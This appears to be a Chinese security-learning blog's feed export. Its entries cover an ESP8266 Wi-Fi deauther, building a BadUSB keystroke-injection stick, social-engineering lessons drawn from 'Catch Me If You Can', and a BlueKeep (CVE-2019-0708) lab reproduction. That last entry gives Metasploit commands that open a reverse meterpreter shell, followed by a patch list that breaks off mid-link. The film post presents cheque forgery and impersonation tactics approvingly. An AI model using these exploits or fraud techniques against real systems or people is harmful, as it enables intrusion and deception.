<p>Attacks页面就是攻击指令页面，可以控制deauth，beacon 的开始/停止。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg11.PNG" title="timg">

<p>Settings页面对Esp8266_deauther整个项目进行设置，比如自动保存间隔，默认的WIFI名称/密码，重启/关闭，版本等等</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg12.PNG" title="timg">


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>几个小时下来没白费，也算是弄出来了，就是中途头铁使用Arduino IDE那会浪费很多时间，整的人也很自闭，不过结果还是好的。最后没有说明具体以如何使用，因为能做到这一步也不是傻子了，界面一看就都懂了。自己做完也迫不及待的实验了一下（经过同意的），确实有用。板子很容易热，但是不影响啥，毕竟是小玩意儿，不能和专业的比。想了想，配合Kali抓指定wifi握手包会不会有奇效？先保留思考，以后再整。</p>
<p>参考文献：</p>
<p><a href="https://github.com/spacehuhn/esp8266_deauther">https://github.com/spacehuhn/esp8266_deauther</a></p>
<p><a href="https://www.jianshu.com/p/f064ca36ee92" target="_blank" rel="noopener">https://www.jianshu.com/p/f064ca36ee92</a></p>
<p><a href="https://blog.csdn.net/mjx19951117/article/details/95808633" target="_blank" rel="noopener">https://blog.csdn.net/mjx19951117/article/details/95808633</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>小玩意儿</tag>
        <tag>物理hack</tag>
        <tag>无线WIFI</tag>
      </tags>
  </entry>
  <entry>
    <title>物理Hacker之BadUsb</title>
    <url>/2019/10/28/%E7%89%A9%E7%90%86Hacker%E4%B9%8BBadUsb/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>已经忘了在什么地方看见了BadUsb相关内容，当时就觉得很酷炫，我也要搞一个，说做就做。</p>
<p>于是在群里咨询了大佬们，厚着脸皮要来了一些资料，加上度娘的帮助，我开始了行动。</p>
<h1 id="关于BadUsb"><a href="#关于BadUsb" class="headerlink" title="关于BadUsb"></a>关于BadUsb</h1><h5 id="什么是BadUsb"><a href="#什么是BadUsb" class="headerlink" title="什么是BadUsb"></a>什么是BadUsb</h5><p>起初我觉得BadUsb同他的名字一样，Bad，Usb。显而易见，是坏的USB，对电脑不利的Usb。通过BadUsb操作，可以完成让目标主机感染病毒、安装后门、开放端口、蓝屏、自动开机、DNS劫持等等一系列操作。在了解一些后，我个人理解BadUsb 是通过插入电脑后执行恶意代码从而达到目的的一种Usb。当然我的这些都是粗浅的解释。<br>专业来说实际上BadUSB就是通过对U盘的固件进行逆向重新编程，相当于改写了U盘的操作系统而进行攻击的。</p>
<a id="more"></a>

<h5 id="BadUsb的内部构造"><a href="#BadUsb的内部构造" class="headerlink" title="BadUsb的内部构造"></a>BadUsb的内部构造</h5><img src="/2019/10/28/物理Hacker之BadUsb/timg1.PNG" title="timg">

<p>U盘由芯片控制器和闪存两部分组成，芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；</p>
<p>闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p>
<h5 id="为什么可以使用BadUsb攻击？"><a href="#为什么可以使用BadUsb攻击？" class="headerlink" title="为什么可以使用BadUsb攻击？"></a>为什么可以使用BadUsb攻击？</h5><p>这就要说到USB协议中存在的安全漏洞。</p>
<p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码</p>
<p>所以BadUsb实际上是利用HID(Human InterfaceDevice,是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击的类型。</p>
<p>其他的在BadUsb出现之前，类似还有<a href="https://blog.csdn.net/ctonegao/article/details/49406763" target="_blank" rel="noopener">USB RUBBERDUCKY和Teensy</a> 。</p>
<h1 id="制作BadUsb"><a href="#制作BadUsb" class="headerlink" title="制作BadUsb"></a>制作BadUsb</h1><p>严格意义上不能说制作，因为固件很难自己制作出来的，所以我从某宝上买个板子，之后再写入代码。</p>
<h5 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h5><p>某宝上20-40一个，内部就是一个Arduino Leonardo开发板，然后包装成Usb的样子</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg2.PNG" title="timg">

<p>2天到货，就是这么一个东西</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg4.jpg" title="timg">

<h5 id="软件准备"><a href="#软件准备" class="headerlink" title="软件准备"></a>软件准备</h5><p>现在板子有了，接下来就是写代码，这里使用Arduino IDE 。百度搜索即可下载得到</p>
<p>安装完成后，打开dalao给的测试代码，先看一下界面</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg3.PNG" title="timg">

<p>一看见代码，明白人都明白，就是模拟键盘！</p>
<h5 id="操作准备"><a href="#操作准备" class="headerlink" title="操作准备"></a>操作准备</h5><p>刚买来的开发板里面是没有东西的，所以不必担心可以放心的插到电脑上，当然不排除黑心商家，提前往里面放点什么，还是要提高警惕的。插到电脑上之后，在设备管理器中可以看见插入的开发板</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg5.PNG" title="timg">

<p>在Arduino IDE中菜单栏工具中选择开发板→开发板管理器</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg6.png" title="timg">

<p>联网安装Arduino AVR Boards板子：</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg7.PNG" title="timg">

<p>到这里就基本准备完成，之后写完代码按Ctrl+R 验证\编译通过 等待底下提示就完成了</p>
<h5 id="更改代码"><a href="#更改代码" class="headerlink" title="更改代码"></a>更改代码</h5><p>假设BadUsb写入了蓝屏代码，那下次想要更改代码怎么办？</p>
<p>提前桌面新建一个空白txt打开，在插入BadUsb时鼠标不停地点击txt内部，让模拟键盘的输入，都输入到txt文档里，等待全部执行完，就可以正常更改代码了</p>
<p>这里是一些我已经收集到的现成代码</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg8.PNG" title="timg">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>成本低，方法简单，黑科技。方法总比困难多，配合社工使用，效果出奇！</p>
<h5 id="相关文章-："><a href="#相关文章-：" class="headerlink" title="相关文章 ："></a>相关文章 ：</h5><p><a href="https://blog.csdn.net/kclax/article/details/90722080" target="_blank" rel="noopener">https://blog.csdn.net/kclax/article/details/90722080</a></p>
<p><a href="https://www.cnblogs.com/lee-li/p/9080160.html" target="_blank" rel="noopener">https://www.cnblogs.com/lee-li/p/9080160.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1480567" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1480567</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>小玩意儿</tag>
        <tag>物理hack</tag>
      </tags>
  </entry>
  <entry>
    <title>从电影看社工：《逍遥法外》</title>
    <url>/2019/10/18/%E4%BB%8E%E7%94%B5%E5%BD%B1%E7%9C%8B%E7%A4%BE%E5%B7%A5%EF%BC%9A%E3%80%8A%E9%80%8D%E9%81%A5%E6%B3%95%E5%A4%96%E3%80%8B/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://baike.baidu.com/item/%E7%8C%AB%E9%BC%A0%E6%B8%B8%E6%88%8F/24452?fr=aladdin" target="_blank" rel="noopener">《猫鼠游戏》</a>（英语名：Catch Me If You Can）也被译为《逍遥法外》是梦工场电影公司出品、斯蒂文·斯皮尔伯格执导的犯罪电影，由莱昂纳多·迪卡普里奥、汤姆·汉克斯主演，于2002年12月25日在美国上映。<br>该片根据小弗兰克·阿巴戈内尔的自传《有本事来抓我吧——一个诈骗犯令人惊异的真实故事》改编，讲述了FBI探员卡尔与擅长伪造文件的罪犯弗兰克之间进行一场场猫抓老鼠的较量的故事。本片的主角原型为小弗兰克·阿巴格诺，FBI史上年纪最小的头号通缉犯，15岁伪造支票，17岁假扮飞行员，不到二十岁伪造了教师，医生，律师等多个身份。</p>
<p>我将从电影情节中，具体剖析小弗兰克·阿巴格诺的一次次社工行为。</p>
<a id="more"></a>


<h1 id="欺骗的开始"><a href="#欺骗的开始" class="headerlink" title="欺骗的开始"></a>欺骗的开始</h1><p>从电影中可以看见小弗兰克·阿巴戈内尔的第一次欺骗是在遭遇家庭变故后转学后的第一堂课，为报复同学欺凌，小弗兰克·阿巴戈内尔刚上课的第一天便假扮代课老师，给学生们好好“上了一课”。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg1.PNG" title="timg">

<p>在这一周里，小弗兰克·阿巴戈内尔给同学们上课、复习、布置作业，甚至开了一次家长会，期间没有一个人发现异常，连真的代课老师都信以为真。</p>
<p>小弗兰克·阿巴戈内尔在影片的一开始就让我震惊了，真乃神人！这样的事情往往是我们学生时代只敢在心里想想的，而他真的做了，还做的很成功！这就是小弗兰克·阿巴戈内尔的一次欺骗，也是一次社工。</p>
<p>小弗兰克·阿巴戈内尔做了什么？</p>
<h5 id="模仿老师的语气、老师的姿态"><a href="#模仿老师的语气、老师的姿态" class="headerlink" title="模仿老师的语气、老师的姿态"></a>模仿老师的语气、老师的姿态</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg3.PNG" title="timg">

<h5 id="满怀自信的行动"><a href="#满怀自信的行动" class="headerlink" title="满怀自信的行动"></a>满怀自信的行动</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg2.PNG" title="timg">

<p>而因为转学的缘故小弗兰克·阿巴戈内尔恰巧穿着以前学校的制服，让他和周围的同学“与众不同”。加上自信的语气，动作，这一切都暗暗告诉着周围的人，我，小弗兰克·阿巴戈内尔就是这里的代课老师！</p>
<p>这一次的成功小弗兰克·阿巴戈内尔从穿着、语气、动作模仿了代课老师，让同学信以为真。</p>
<h1 id="童年的不幸遭遇"><a href="#童年的不幸遭遇" class="headerlink" title="童年的不幸遭遇"></a>童年的不幸遭遇</h1><p>小弗兰克·阿巴戈内尔遭遇家庭变故，父母离婚，无法接受现实的他决定离家出走，作为一个16岁的少年，他身无分文，于是，再一次的激发了他与生俱来的能力，欺骗。</p>
<p>他开始伪造支票</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg5.PNG" title="timg">

<p>同时试图瞒天过海兑换假支票</p>
<h5 id="通过金钱吸引，降低防范"><a href="#通过金钱吸引，降低防范" class="headerlink" title="通过金钱吸引，降低防范"></a>通过金钱吸引，降低防范</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg6.PNG" title="timg">

<h5 id="通过表达孝心，放松警惕"><a href="#通过表达孝心，放松警惕" class="headerlink" title="通过表达孝心，放松警惕"></a>通过表达孝心，放松警惕</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg7.PNG" title="timg">

<h5 id="利用学生身份，求取帮助"><a href="#利用学生身份，求取帮助" class="headerlink" title="利用学生身份，求取帮助"></a>利用学生身份，求取帮助</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg8.PNG" title="timg">

<h5 id="通过假装生病，博得同情"><a href="#通过假装生病，博得同情" class="headerlink" title="通过假装生病，博得同情"></a>通过假装生病，博得同情</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg9.PNG" title="timg">

<p>即便他依旧失败了，但是却留给了他很多经验，给了我们很多方法</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg10.PNG" title="timg">



<h1 id="世界大盗"><a href="#世界大盗" class="headerlink" title="世界大盗"></a>世界大盗</h1><p>经历了多处碰壁的小弗兰克·阿巴戈内尔没有放弃。偶然的机会，让他打起了飞行员的注意，他想冒充飞行员。这一次的小弗兰克·阿巴戈内尔没有贸然行动，而是先假冒学生记者，以学生的身份对飞行员内部进行采访，收集信息，在充分了解飞行员这个职业后，保证自己不会轻易露馅。这便是常说的踩点，very very的重要</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg11.PNG" title="timg">

<p>经过一些了解，小弗兰克·阿巴戈内尔成功的伪装成一名飞行员，在世界的上空免费飞行了百万英里。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg12.PNG" title="timg">

<p>从伪装成一名飞行员开始，小弗兰克·阿巴戈内尔才算是真正走上了他的欺骗之旅。之后他又利用天赋，成功制造假的航空支票并兑换了上百万美元，这些行为渐渐引起了FBI的注意。在他即将被追捕的时候，他又伪装成美国特情局的人，假装自己已经被“自己”抓捕了，借此逃脱一轮。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg13.PNG" title="timg">

<p>从此处逃脱后，小弗兰克·阿巴戈内尔在一处小镇伪装成了一名医生，利用伪装支票的手法，他从其他地方剪裁，烙印辨别标志，利用从电视上学到的医学话术，达到以假乱真的效果，让所有人相信他就是一名医生。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg14.PNG" title="timg">

<h1 id="回归正途"><a href="#回归正途" class="headerlink" title="回归正途"></a>回归正途</h1><p>虽然小弗兰克·阿巴戈内尔拥有过人的天赋，但是法网恢恢疏而不漏，最终他还是被FBI探员卡尔在法国的一个小镇逮捕。在服役期间卡尔发现了小弗兰克·阿巴戈内尔的天赋，最后让他在FBI经济犯罪科帮助破案，完成他剩下的劳役。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg16.PNG" title="timg">

<h1 id="电影中的社工"><a href="#电影中的社工" class="headerlink" title="电影中的社工"></a>电影中的社工</h1><p>从小弗兰克·阿巴戈内尔的遭遇中，我们可以看到很多社工的影子在里面。小弗兰克·阿巴戈内尔的每一次伪装都是社工。</p>
<h5 id="伪装成老师"><a href="#伪装成老师" class="headerlink" title="伪装成老师"></a>伪装成老师</h5><p>小弗兰克·阿巴戈内尔 从着装、语言、动作等方面模拟老师，让同学信以为真</p>
<h5 id="伪装成飞行员"><a href="#伪装成飞行员" class="headerlink" title="伪装成飞行员"></a>伪装成飞行员</h5><p>小弗兰克·阿巴戈内尔 从着装、专业知识、仪态等方面模仿飞行员，让周围人相信他是一名飞行员，期间包括踩点了解信息等等重要途径</p>
<h5 id="伪装成医生"><a href="#伪装成医生" class="headerlink" title="伪装成医生"></a>伪装成医生</h5><p>小弗兰克·阿巴戈内尔利用报纸上的院校标志，纪念品上的院校标志等等先伪造了一份十分厉害的简历，再去面试医生。成功成为医生后，小弗兰克·阿巴戈内尔通过电视上学到的医用术语瞒天过海，始终维持着自己的身份。</p>
<h5 id="伪造支票"><a href="#伪造支票" class="headerlink" title="伪造支票"></a>伪造支票</h5><p>小弗兰克·阿巴戈内尔在伪造支票非常有天赋，他注意到了方方面面，从支票的墨水、厚度、折痕、标志各个方面伪造支票，利用支票跨州传递到银行的真空期达到套取现金的目的。在前期小弗兰克·阿巴戈内尔伪造的支票还不完美的时候，他还通过其他途径吸引支票兑换者的注意力，比如通过金钱，假装生病，利用学生身份，利用对方的同情心等等方法，降低对方的防范意识，以防假支票被发现。</p>
<h1 id="一次成功的社工"><a href="#一次成功的社工" class="headerlink" title="一次成功的社工"></a>一次成功的社工</h1><p>从小弗兰克·阿巴戈内尔的经历来看，不管是伪装成什么职业，飞行员，老师，医生也好，最不可缺少的就是自信与勇气。</p>
<p>首先就要勇气去做，其次要有信心自己能做好。只有自身展现出自信，才能让周围人相信。如果唯唯诺诺，鬼鬼祟祟难免让周围人怀疑。</p>
<p>然后需要充分的知识铺垫，才能让自己维持身份，在进行相关职业活动的时候不会因为自己是外行人而露出破绽。</p>
<p>最后一点就是要注意细节，往往细节决定成败。就是因为小弗兰克·阿巴戈内尔注意墨水，纸张厚度，折痕这些小细节，才让他手中的支票连银行都无法辨认。</p>
<p>以上这些都是从一部电影中吸取来的，而我们生活中也处处充满着社工的痕迹，只要我们细心发现，就能从方方面面学到更多，从而提升自己。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>小玩意儿</tag>
      </tags>
  </entry>
  <entry>
    <title>知己知彼-信息搜集</title>
    <url>/2019/10/06/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>这是一次有关信息搜集的小结。</p>
<p>导图主要包含搜集信息的常用途径汇总，如Google Hacking常用语法，Shodan基本使用语法，Recon-ng，Nslookup，cupp，Exif，Archive</p>
<a id="more"></a>

<img src="/2019/10/06/信息搜集/信息搜集.jpg" title="avatar">
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>信息搜集</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title>MyQR实现动态二维码</title>
    <url>/2019/10/03/%E5%8A%A8%E6%80%81%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逛公众号的时候，发现myqr，github上已经6000+Star，感觉挺有趣，就想着自己也动手做一个。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>首先通过pip安装myqr库</p>
<pre><code>pip install myqr</code></pre><p>接下来有两种方法可以实现。</p>
<a id="more"></a>

<h4 id="第一种方式通过控制台命令"><a href="#第一种方式通过控制台命令" class="headerlink" title="第一种方式通过控制台命令"></a>第一种方式通过控制台命令</h4><p>myqr参数</p>
<p>-v    {1,2,3,…,40}    控制边长，范围是1至40，数字越大边长越大</p>
<p>-l    {L,M,Q,H}    控制纠错水平，范围是L、M、Q、H，从左到右依次升高</p>
<p>-n    output-filename    控制文件名，默认文件名是“ qrcode.png “,格式可以是 .jpg， .png ，.bmp ，.gif</p>
<p>-d    output-directory    设置输出文件路径，而默认存储位置是当前目录</p>
<p>-p    picture_file    引入图片，生成结合图片的二维码</p>
<p>-c    不用取    可以使产生的图片由黑白变为彩色的</p>
<p>-con    contrast    对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为1.0</p>
<p>-bri    brightness    亮度，用法和取值与 -con 相同</p>
<pre><code>myqr http://ggboom993.org.cn -p timg1.gif -c</code></pre><p>我这里二维码的内容就使用我的博客地址：<a href="http://ggboom993.org.cn" target="_blank" rel="noopener">http://ggboom993.org.cn</a></p>
<p>接着使用-p参数指定二维码的样式(图片) 采用我预先下载好的gif图片 timg1.gif </p>
<p>图片放在C:\Users\dell 目录下</p>
<img src="/2019/10/03/动态二维码/timg1.gif" title="timg">


<p>使用-c参数让二维码变成彩色，我这里的gif本身就是黑白的，有没有-c都可以</p>
<p>如果没有指定生成图片的名称，myqr会在当前目录下默认生成名称为timg1_QRcode的gif图片，如果有需要则可以使用-n参数指定生成图片的名称。</p>
<p>最后生成的动态二维码如下：</p>
<img src="/2019/10/03/动态二维码/timg2.gif" title="timg">

<h4 id="第二种方式通过python实现"><a href="#第二种方式通过python实现" class="headerlink" title="第二种方式通过python实现"></a>第二种方式通过python实现</h4><p>python代码如下</p>
<pre><code>from MyQR import myqr

myqr.run(
    words=&apos;http://ggboom993.org.cn&apos;,
    pictures=&apos;timg.tif&apos;,
    colorized=True,
    save_name=&apos;save_3.tif&apos;,
    )</code></pre><p>words内指定二维码内容</p>
<p>Pictures指定二维码样式（图片）</p>
<p>colorized指定二维码是否为彩色</p>
<p>save_name指定生成图片的名称</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>小玩意儿</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透相关小结</title>
    <url>/2019/10/03/aboutWebSecurity/</url>
    <content><![CDATA[<p>此次Web安全的小结，完成于2018年8月，以导图形式留存。</p>
<p>导图内容主要包含Web渗透常用方法如SQL注入、XSS、CSRF、SSRF、爆破、越权、目录遍历、PHP反序列化、XXE、文件上传下载、REC远程执行的简单描述和简单总结。</p>
<a id="more"></a>

<img src="/2019/10/03/aboutWebSecurity/Web安全.jpg" title="avatar">

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0708漏洞复现</title>
    <url>/2019/10/01/CVE-2019-0708/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>北京时间5月15日，微软发布了针对远程桌面服务的远程执行代码漏洞CVE-2019-0708的修复程序, 漏洞触发无需用户交互。这也就意味着，攻击者可以利用该漏洞制作类似于2017年席卷全球的WannaCry类的蠕虫病毒，进行大规模传播和破坏。</p>
<p>远程桌面服务（以前称为终端服务）中存在远程执行代码漏洞，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序; 查看，更改或删除数据; 或创建具有完全用户权限的新帐户。要利用此漏洞，攻击者仅需要通过RDP向目标系统远程桌面服务发送恶意请求。</p>
<a id="more"></a>

<p>该漏洞影响了某些旧版本的Windows系统，如下：</p>
<p>Windows 7</p>
<p>Windows Server 2008 R2</p>
<p>Windows Server 2008</p>
<p>Windows 2003</p>
<p>Windows XP</p>
<p>需要注意的是：Windows 8和Windows 10及之后版本的用户不受此漏洞影响。</p>
<p>本次漏洞时间线：</p>
<p>1、2019年5月14日<br>微软发布远程桌面服务远程代码执行漏洞CVE-2019-0708的安全通告及相应补丁，并特别针对此漏洞发布了专门的说明，提示这是一个可能导致蠕虫泛滥的严重漏洞</p>
<p>2、2019年5月23日<br>互联网公开渠道出现具有非破坏性漏洞扫描功能的PoC程序</p>
<p>3、2019年5月25日<br>黑客开始大规模扫描存在漏洞的设备</p>
<p>4、2019年5月30日<br>微软再次发布对于CVE-2019-0708漏洞做修补的提醒，基于漏洞的严重性强烈建议用户尽快升级修复</p>
<p>5、2019年5月31日<br>互联网公开渠道出现能导致蓝屏的PoC代码，斗象安全应急响应团队已经确认了PoC代码的可用性</p>
<p>6、2019年6月8日<br>Metasploit的商业版本开始提供能导致远程代码执行的漏洞利用模块</p>
<p>7、2019年7月31日<br>商业漏洞利用套件Canvas加入了CVE-2019-0708的漏洞利用模块</p>
<p>8、2019年9月7日<br>已有公开渠道的Metasploit CVE-2019-0708漏洞利用模块发布，构成现实的蠕虫威胁。</p>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><pre><code>靶机：cn_windows_7_ultimate_with_sp1_x64  10.10.10.129

主机：Kali Linux 10.10.10.128
     配置CVE 2019-0708相关EXP</code></pre><h2 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h2><p>1、靶机关闭防火墙，开启3389端口，开启远程服务</p>
<p>2、kali中对EXP进行如下替换（EXP Github：<a href="https://github.com/rapid7/metasploit-framework/pull/12283/files）">https://github.com/rapid7/metasploit-framework/pull/12283/files）</a></p>
<pre><code>rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

rdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

cve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

cve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce

替换完成后 msf 下执行reload_all</code></pre><p>3、Kali中进入msf执行</p>
<pre><code>search cve-2019-0708
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set rhosts 10.10.10.129
set lhosts 10.10.10.128
set target 3
set payload windows/x64/meterpreter/reverse_tcp
exploit</code></pre><p>4、执行成功</p>
<img src="/2019/10/01/CVE-2019-0708/CVE-2019-0807.PNG">

<p> ps: 第一次复现时成功get shell。第二次复现，只能让靶机蓝屏，暂未查明原因，待补充。</p>
<p>参考教程：</p>
<p><a href="https://www.cnblogs.com/nul1/p/11482119.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/11482119.html</a></p>
<p><a href="https://blog.csdn.net/qq_29647709/article/details/100610285" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/100610285</a></p>
<p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference</a>        </p>
<h2 id="0x03-最后附上补丁地址"><a href="#0x03-最后附上补丁地址" class="headerlink" title="0x03 最后附上补丁地址"></a>0x03 最后附上补丁地址</h2><p>官方补丁下载</p>
<p>Windows 7 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows 7 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows Server 2008 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu</a><br>Windows Server   2008 Itanium<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</a><br>Windows Server 2008 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu</a><br>Windows Server 2008 R2 Itanium<br>    <a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu</a><br>Windows Server 2008 R2 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Server   2003 x86<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe</a><br>Windows Server 2003 x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</a><br>Windows XP SP3<br>    <a href="http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe</a><br>Windows XP SP2 for x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe" target="_blank" 